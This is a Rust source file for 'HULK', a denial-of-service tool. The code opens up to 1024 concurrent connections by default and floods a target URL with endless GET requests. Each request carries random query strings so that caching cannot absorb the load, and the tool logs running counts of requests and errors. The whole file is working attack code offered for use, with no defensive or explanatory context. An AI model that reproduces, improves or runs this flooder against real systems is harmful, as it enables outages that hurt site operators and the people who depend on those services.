use clap::Parser;
use hyper::{Client, Uri};
use hyper::body::HttpBody as _;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use futures::future::join_all;
use hyper_tls::HttpsConnector;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::io;
use std::io::Write;

static REQ_COUNT: AtomicUsize = AtomicUsize::new(0);
static ERR_COUNT: AtomicUsize = AtomicUsize::new(0);

#[derive(Parser, Debug)]
#[clap(author = "Hexalyse", about = "HULK DoS tool")]
struct CliArguments {
    #[clap(short, long, default_value = "1024")]
    /// Maximum number of concurrent connections to the target
    max_connections: usize,
    /// Target URL (eg. http://example.com)
    target: String,
    /// verbose mode
    #[clap(short, long, takes_value = false, required = false)]
    verbose: bool,
}

fn random_string(n: usize) -> String {
    thread_rng().sample_iter(&Alphanumeric)
                .take(n)
                .map(char::from)
                .collect()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let args = CliArguments::parse();

    // let tasks = (0..args.max_connections).map(|x| {
    //     fetch_url(args.target.clone(), x)
    // });
    // join_all(tasks).await;
    println!("[*] Starting HULK attack on {}", args.target);
    let tasks = (0..args.max_connections).map(|x| {
        let target = args.target.clone();
        tokio::spawn(async move {
            fetch_url(target, x).await
        })
    });
    join_all(tasks).await;
    
    Ok(())
}

async fn fetch_url(target: String, _thread: usize) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let https = HttpsConnector::new();
    let client = Client::builder()
        .build::<_, hyper::Body>(https);
    //let client = Client::new();
    loop {
        // if url already contains a ?, we need to add a & to the end of the query string instead of a ?
        let uri_string = format!("{}?{}={}", target, random_string(10), random_string(10));
        let uri = uri_string.parse::<Uri>()?;
        let mut resp = client.get(uri).await?;
        if resp.status() != hyper::StatusCode::OK {
            println!("\nError: {}", resp.status());
            ERR_COUNT.fetch_add(1, Ordering::Relaxed);
        }
        let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed);
        if total_reqs % 100 == 0 {
            let err_count = ERR_COUNT.load(Ordering::Relaxed);
            print!("\r[*] {} requests | {} OK | {} errors", total_reqs, total_reqs - err_count, err_count);
            io::stdout().flush().unwrap();
        }
        resp.body_mut().data().await;
    }
}